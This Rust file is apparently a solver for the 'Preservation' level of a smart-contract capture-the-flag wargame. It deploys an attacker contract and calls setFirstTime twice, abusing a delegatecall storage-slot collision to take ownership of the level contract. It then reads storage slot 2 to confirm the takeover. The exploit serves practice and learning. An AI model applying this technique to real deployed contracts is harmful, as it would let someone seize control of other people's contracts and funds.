use crate::types::*;
use crate::utils;
use ethers::prelude::*;
use ethers::utils::{compile, Solc};
use std::error::Error;
use std::sync::Arc;

abigen!(
    LevelContract,
    r#"[
        function setFirstTime(uint _timeStamp) public
    ]"#,
);

pub async fn solve(level: &Level, config: &EnvironmentConfig) -> Result<(), Box<dyn Error>> {
    let client = Arc::new(utils::create_signer_middleware(
        config.wallet_mnemonic_path.clone(),
        config.network.chain_id,
        config.network.rpc.clone(),
    )?);

    let compiled = compile(Solc::new("./contracts/16_preservation/solution.sol")).await?;
    let solution_contract = compiled
        .get("Solution")
        .expect("could not find solution contract");
    let factory = ContractFactory::new(
        solution_contract.abi.clone(),
        solution_contract.bytecode.clone(),
        client.clone(),
    );
    println!("Deploying solution contract");
    let solution_contract = factory.deploy(())?.legacy().send().await?;
    let solution_address = solution_contract.address();
    println!("Solution contract deployed at {}\n", solution_address);

    let level_contract = LevelContract::new(level.instance.parse::<Address>()?, client.clone());
    let mut receipt = level_contract
        .set_first_time(utils::address_to_uint256(solution_address))
        .legacy()
        .send()
        .await?
        .await?;
    println!(
        "1st setFirstTime():\n{}",
        serde_json::to_string_pretty(&receipt)?
    );

    receipt = level_contract
        .set_first_time(utils::address_to_uint256(client.default_sender().unwrap()))
        .legacy()
        .gas(1000000)
        .send()
        .await?
        .await?;
    println!(
        "2nd setFirstTime():\n{}",
        serde_json::to_string_pretty(&receipt)?
    );

    let owner = client
        .get_storage_at(
            level.instance.parse::<Address>()?,
            H256::from_low_u64_be(2),
            None,
        )
        .await?;
    println!("owner: {:?}", owner);

    Ok(())
}
